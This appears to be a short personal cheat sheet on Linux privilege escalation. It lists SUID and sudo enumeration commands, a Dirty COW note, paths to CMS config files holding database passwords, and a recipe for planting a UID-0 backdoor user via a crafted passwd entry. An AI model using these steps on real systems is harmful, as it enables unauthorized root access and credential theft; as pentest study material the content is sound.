# Linux Privilege Esculation

## Basic commands

```bash
# running services
ps -aux

# World writable files
find / -type f -perm 0777

# print唔同user's home directory
ls -lahR /home/  

# Fixing Path variable
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin  
```

## Abusing sudo rights

```bash
sudo -l
```

## SUID

```bash
find / -perm -u=s -type f 2>/dev/null
```

## Dirty Cow

    Old vervion of ubuntu <3.9 is highly vulnerable to dirty cow

## Password files

```
• WordPress: /var/www/html/wp-config.php
• Joomla: /var/www/configuration.php
• Dolphin CMS: /var/www/html/inc/header.inc.php
• Drupal: /var/www/html/sites/default/settings.php
• Mambo: /var/www/configuration.php
• PHPNuke: /var/www/config.php
• PHPbb: /var/www/config.php
```

## Adding new user
```bash
# The following command uses Perl to generate a crypt hash from password ‘pom’ and with a salt ‘pom’
perl -e 'print crypt("pom", "pom"),"\n"'

pom:poD7u2nSiBSLk:0:0:root:/root:/bin/bash

su pom
Then enter the password: pom
```

## SQL UDF
> https://infamoussyn.wordpress.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/

## Tools

### Process Monitor
> https://github.com/braaaax/snippets/blob/master/procmon.sh